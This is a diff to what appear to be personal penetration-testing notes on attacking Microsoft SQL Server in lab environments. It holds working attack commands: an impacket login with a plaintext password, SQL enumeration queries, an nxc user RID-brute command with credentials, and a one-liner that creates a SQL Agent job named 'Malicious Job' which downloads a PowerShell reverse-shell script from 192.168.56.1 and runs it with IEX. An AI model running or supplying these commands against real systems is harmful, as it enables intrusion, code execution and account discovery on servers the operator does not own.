@@ -1,3 +1,23 @@
+some great tutorials [here](https://www.bordergate.co.uk/attacking-mssql/)
+
+---
+
+```sql
+-- enum databases:
+enum_db
+
+-- select database:
+use <database>
+
+-- enum tables:
+SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
+
+
+```
+
+
+---
+
 ```powershell
 # connection
 impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -windows-auth
@@ -148,3 +168,8 @@ one liner:
 USE msdb; EXEC sp_add_job @job_name = N'Malicious Job'; EXEC sp_add_jobstep @job_name = N'Malicious Job', @step_name = N'Execute PowerShell Script', @subsystem = N'PowerShell', @command = N'(New-Object Net.WebClient).DownloadString("http://192.168.56.1/rev.ps1")|IEX;', @retry_attempts = 5, @retry_interval = 5; EXEC sp_add_jobserver @job_name = N'Malicious Job'; EXEC sp_start_job @job_name = N'Malicious Job';
 ```
 
+---
+### enumerate users
+```bash
+nxc mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
+```
